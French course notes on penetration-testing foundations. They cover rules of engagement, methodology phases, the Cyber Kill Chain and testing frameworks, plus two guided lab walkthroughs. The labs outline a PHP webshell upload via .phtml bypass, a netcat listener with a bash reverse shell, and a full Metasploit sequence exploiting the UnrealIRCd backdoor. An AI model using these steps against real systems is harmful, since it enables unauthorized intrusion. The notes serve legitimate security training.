# Module 1: Fondements des tests d'intrusion ( Penetration Testing Foundations )

Ce module pose les bases méthodologiques du métier de pentester : comprendre le cadre légal et éthique d'un test d'intrusion, les phases d'une mission réelle, les frameworks de référence, et mettre tout ça en pratique sur deux exercices guidés (Web puis Infrastructure).

---

## 🕵️ Plongez dans le test d'intrusion

Les bases théoriques : qu'est-ce qu'un pentest, dans quel cadre légal, et selon quelle méthodologie.

- **Définition** : un pentest est un audit autorisé qui reproduit les techniques d'un attaquant réel pour trouver des failles avant qu'un vrai attaquant ne le fasse.
- **Éthique et cadre légal** :
  - **Scoping** : testeur et client s'accordent en amont sur les systèmes, outils et techniques autorisés.
  - **Hat categories** : White hat (légal, bienveillant), Grey hat (résultat bon mais sans respect strict du cadre), Black hat (criminel).
  - **Rules of Engagement (ROE)** : document qui encadre la mission — autorisation explicite, périmètre précis (scope), règles (techniques permises/interdites).
- **Méthodologie en 5 phases** :
  1. **Information Gathering** : collecte d'infos publiques (OSINT), sans scanner.
  2. **Enumeration/Scanning** : découverte des services/applications actifs.
  3. **Exploitation** : exploiter une faille pour obtenir un accès initial.
  4. **Privilege Escalation** : étendre l'accès (horizontale = autre utilisateur même niveau, verticale = niveau de droits supérieur).
  5. **Post-exploitation** : pivoter vers d'autres machines, effacer les traces, rédiger le rapport.
- **Types de test** :
  - **Black-box** : aucune connaissance interne, le testeur part de zéro comme un attaquant externe.
  - **Grey-box** : connaissance partielle — approche la plus courante en entreprise.
  - **White-box** : connaissance complète (code source inclus) — le plus exhaustif mais le plus long.

## 🌐 Test d'intrusion guidé : Web

Scénario "RecruitX" : chaîner plusieurs vulnérabilités web jusqu'à la compromission complète du serveur.

- **Reconnaissance** : `nmap -sV -sT -p- <TARGET_IP>` pour scanner tous les ports, `curl -I` pour lire les en-têtes HTTP (Apache/PHP), `gobuster dir` pour découvrir `/admin`, `/api`, `/reset.php`, `/uploads`.
- **IDOR** : copie du cookie de session (`PHPSESSID`) et réutilisation avec `curl -b` pour changer le paramètre `id` et accéder au profil d'autres utilisateurs (y compris l'admin).
- **Reset de mot de passe faible** : `reset.php` renvoie le token de réinitialisation dans la réponse ; combiné à un espace de tokens faible (6 chiffres) et l'absence de rate limiting, cela permet de réinitialiser le mot de passe admin.
- **Accès panel admin** : connexion en admin, test d'upload sur `/admin/upload.php` — suppression de l'attribut `accept` côté client (DevTools), `.php` rejeté mais `.phtml` accepté.
- **RCE** : upload d'un webshell PHP (`shell_exec()` via paramètre `cmd`), exécution de commandes via `curl`, ouverture d'un listener `nc -lvnp 4444`, déclenchement d'un reverse shell bash, lecture du flag.
- **Attack chain** : IDOR + reset faible + upload non filtré = compromission complète — chaque faille seule semblait mineure, c'est l'enchaînement qui a été critique.

## 🖥️ Test d'intrusion guidé : Infrastructure

Même logique que le module Web, mais côté infrastructure réseau/services.

- **Enumeration** : `nmap -sC -sV -T5 -oN scan.txt <TARGET_IP>` — scripts par défaut, détection de versions, scan rapide, sortie sauvegardée pour le rapport.
- **Identification de la faille** : version UnrealIRCd 3.2.8.1 repérée comme vulnérable (backdoor connue).
- **Exploitation Metasploit** : 
`msfconsole
search unrealircd
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS <TARGET_IP>
set payload cmd/unix/reverse
set LHOST <TON_IP>
set LPORT <PORT>
exploit`
-> shell obtenu directement en tant que `webmaster`, sans identifiants.
- **Découverte d'identifiants** : mot de passe root trouvé en clair (`find / -name password*`).
- **Élévation de privilèges** : connexion SSH en root avec le mot de passe trouvé.
- **Reporting** : rédaction d'un exemple de rapport de vulnérabilité avec recommandations de remédiation.


## ⚔️ Cyber Kill Chain

Le modèle Lockheed Martin pour découper une attaque en 7 étapes chronologiques : Reconnaissance → Weaponization → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives.

- **Exercice de classification** : associer des actions concrètes à la bonne étape (ex. *Craft a phishing email* = Weaponization, *Send phishing emails* = Delivery, *Log in with default credentials* = Exploitation, *Add a malicious service* = Installation, *Use HTTPS for communication* = C2, *DNS query* = Reconnaissance, *Data exfiltration* = Actions on Objectives).
- **Intérêt** : comprendre à quel moment de l'attaque on se situe aide à savoir quoi documenter et comment un défenseur peut couper la chaîne à temps.

## 📚 Cadres de tests d'intrusion

Panorama des référentiels méthodologiques utilisés dans l'industrie.

- **OSSTMM** : approche scientifique et métrique du test de sécurité (réseaux filaires, télécoms, sans-fil).
- **OWASP WSTG** : référence principale pour les tests d'applications web.
- **NIST SP 800-115** : guide technique du gouvernement américain pour les tests de sécurité.
- **PTES** : norme pratique, orientée phases, qui colle au déroulement réel d'une mission.
- **ISSAF** : méthodologie historique avec un modèle d'évaluation en 9 étapes.
- **MITRE ATT&CK** : base de connaissances des tactiques/techniques d'attaquants réels — complète les méthodologies plutôt que de les remplacer.
- **Autres** : WASC Threat Classification, CSA Cloud Controls Matrix, OWASP MASTG (mobile), PCI DSS Pentest Guidelines, CBEST.

---

## 📝 Ce que j'ai retenu

Ce module m'a fait comprendre qu'un pentest n'est pas une improvisation technique : c'est un processus encadré (ROE, scope), structuré en phases identiques quel que soit le framework choisi, et où **l'enchaînement de failles mineures** (comme dans RecruitX ou UnrealIRCd) peut produire un compromis total. La Cyber Kill Chain et les frameworks (PTES, OWASP, MITRE ATT&CK) donnent un vocabulaire commun pour documenter précisément à quelle étape on se trouve — essentiel pour un rapport de pentest crédible.
